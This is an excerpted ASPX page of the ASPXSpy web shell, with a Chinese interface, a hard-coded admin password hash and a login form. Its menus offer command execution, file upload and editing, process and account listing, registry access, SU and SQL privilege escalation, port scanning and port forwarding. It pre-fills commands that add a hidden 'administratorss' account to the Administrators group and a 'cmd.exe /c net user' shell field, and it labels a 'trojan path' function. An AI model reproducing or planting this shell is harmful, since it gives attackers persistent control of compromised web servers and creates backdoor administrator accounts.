...
E-mail : һ
*/
public string Password="626595aa3d48f6c9703b258f731089b4";//admin
public string vbhLn="A NO";
public int TdgGU=1;
...
<div id="ljtzC" runat="server" style=" margin:15px" enableviewstate="false" visible="false" >
  <p align="center"><span style="font:11px Verdana;"><span class="STYLE2">密码</span>:</span>
      <asp:TextBox ID="HRJ" runat="server" Columns="10" CssClass="Bin_Style_Login" TextMode="Password" ToolTip="你的密码？" ></asp:TextBox>
      <asp:Button ID="ZSnXu" runat="server" Text="登陆" CssClass="Bin_Style_Login" OnClick="xVm" BorderColor="#FF0000" ForeColor="#000000" BackColor="#CCCCCC"/>
    Copyright &copy; 2009 Bin -- <a href="<script>alert('1');</script> " target="_blank" class="STYLE1">QQ:53374881</a></p>
  </div>
<div id="ZVS" runat="server">
<div id="Zzj" runat="server">
<table width="100%" border="0" cellpadding="0" cellspacing="0">
<tr class="head">
<td ><span style="float:right;"><a href="http://hacklm.cn" target="_blank">ASPXSpy Ver:2015</a></span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
</tr>
<tr class="alt1">
<td><span style="float:right;" id="Bin_Span_FrameVersion" runat="server"></span>
<asp:LinkButton ID="UtkN" runat="server" OnClick="YKpI" Text="登出" ></asp:LinkButton> | 
<asp:LinkButton ID="RsqhW" runat="server" Text="文件管理" OnClick="Ybg"></asp:LinkButton> | <asp:LinkButton ID="xxzE" runat="server" Text="执行CMD" OnClick="VOxn"></asp:LinkButton> | <asp:LinkButton ID="nuc" runat="server" Text="IIS探测" OnClick="KjPi"></asp:LinkButton> | <asp:LinkButton ID="OREpx" runat="server" Text="系统进程" OnClick="Grxk"></asp:LinkButton> | <asp:LinkButton ID="jHN" runat="server" Text="进程信息" OnClick="ilC"></asp:LinkButton> | <asp:LinkButton ID="PHq" runat="server" Text="系统帐户" OnClick="Olm"></asp:LinkButton> | <asp:LinkButton ID="wmgnK" runat="server" Text="系统消息" OnClick="HtB"></asp:LinkButton> | <asp:LinkButton ID="FeV" runat="server" Text="文件查找" OnClick="PPtK"></asp:LinkButton> | <asp:LinkButton ID="PVQ" runat="server" Text="SU提权" OnClick="jXhS"></asp:LinkButton> | <asp:LinkButton ID="jNDb" runat="server" Text="注册表查看" OnClick="xSy"></asp:LinkButton> | <asp:LinkButton ID="HDQ" runat="server" Text="端口扫描" OnClick="cptS" ></asp:LinkButton> | <asp:LinkButton ID="AoI" runat="server" Text="SQL提权管理" OnClick="dMx"></asp:LinkButton> | <asp:LinkButton ID="KHbEd" runat="server" Text="端口转发" OnClick="fDO"></asp:LinkButton>
</td>
</tr>
</table>
</div>
...
<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
 <tr>
<td style=" white-space:nowrap">当前路径 : </td>
<td style=" width:100%"><input class="input" id="AXSbb" type="text" style="width:97%;margin:0 8px;" runat="server"/>
</td>
<td style="white-space:nowrap" ><asp:Button ID="xaGwl" runat="server" Text="进入" CssClass="bt" OnClick="EXV"/></td>
 </tr>
</table>
...
<asp:Button ID="RvPp" CssClass="bt" runat="server" Text="上传" OnClick="lbjLD"/>
</div><asp:LinkButton ID="OLJFp" runat="server" Text="木马路径" OnClick="mcCY"></asp:LinkButton> 
| <a href="#" id="Bin_Button_CreateDir" runat="server">新建文件夹</a> | <a href="#" id="Bin_Button_CreateFile" runat="server">新建文件</a>
...
<p><asp:Button ID="JJjbW" runat="server" Text="保存" CssClass="bt" OnClick="DGCoW"/> <asp:Button ID="iCNu" runat="server" Text="退出编辑" CssClass="bt" OnClick="IkkO"/></p>
</div>
<%--CloneTime--%>
...
<p><asp:Button ID="JEaxV" runat="server" Text="保存" CssClass="bt" OnClick="XXrLw"/></p>
<h2>Set last modified &raquo;</h2>
<p>当前文件路径<br/><input class="input" id="pWVL" type="text" size="120" runat="server"/></p>
<p>
...
<p>
<asp:Button ID="kOG" CssClass="bt" runat="server" Text="保存" OnClick="tIykC"/>
</p>
</div>
<%--IISSpy--%>
...
<div runat="server" id="vIac">
 ...
 <p>Argument:</p>
 <p>net user administratorss qq1314520.. /add </p>
 <p>net localgroup administrators administratorss /add <br/>
...
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
 ...
 <tr >
 <td style="width:10%"></td>
 <td colspan="5">CmdShell&nbsp;&nbsp;:&nbsp;<input class="input" runat="server" id="mHbjB" type="text" size="100" value="cmd.exe /c net user"/> <asp:Button ID="SPhc" CssClass="bt" runat="server" Text="执行EXP" OnClick="lRfRj"/></td>
 </tr>
</table>
...
<p>Registry Path : <asp:TextBox id="qPdI" style="width:85%;margin:0 8px;" CssClass="input" runat="server"/><asp:Button ID="MoNA" runat="server" Text="进入" CssClass="bt" onclick="RAFL"/></p>
<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
...
<p>
IP : <asp:TextBox id="MdR" style="width:10%;margin:0 8px;" CssClass="input" runat="server" Text="127.0.0.1"/> 
端口 : 
<asp:TextBox id="lOmX" style="width:40%;margin:0 8px;" CssClass="input" runat="server" Text="21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500"/> <asp:Button ID="CmUCh" runat="server" Text="扫描" CssClass="bt" OnClick="ELkQ"/>
</p>
...
<asp:Button runat="server" ID="WOhJ" CssClass="bt" Text="执行" onclick="ORUgV"/></td></tr></table>
...
<tr align="center">
<td style="width:5%"></td>
<td style="width:20%" align="left">本机IP: 
  <input class="input" runat="server" id="eEpm" type="text" size="20" value="127.0.0.1"/></td>
<td style="width:20%" align="left">转发端口 : 
  <input class="input" runat="server" id="iXdh" type="text" size="20" value="3389"/></td>
<td style="width:20%" align="left">转发ip : 
  <input class="input" runat="server" id="llH" type="text" size="20" value="www.baidu.com"/></td>
<td style="width:20%" align="left">远程主机监听端口: 
  <input class="input" runat="server" id="ZHS" type="text" size="20" value="51"/></td></tr>
<tr align="center"><td colspan="5"><br/><asp:Button ID="FJE" CssClass="bt" runat="server" Text="转发" OnClick="wDZ"/> 
<asp:Button ID="giX" CssClass="bt" runat="server" Text="重置" OnClick="vJNsE"/> 
<asp:Button ID="GFsm" CssClass="bt" runat="server" Text="重新转发" OnClick="tYoZ"/></td></tr></table></div>
<%--Search--%>
...
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">Copyright &copy; 2006-2009 <a href="http://hacklm.cn" target="_blank">A NO:QQ53374881 </a>All Rights Reserved.</div>
</div>
</form>
</body>
</html>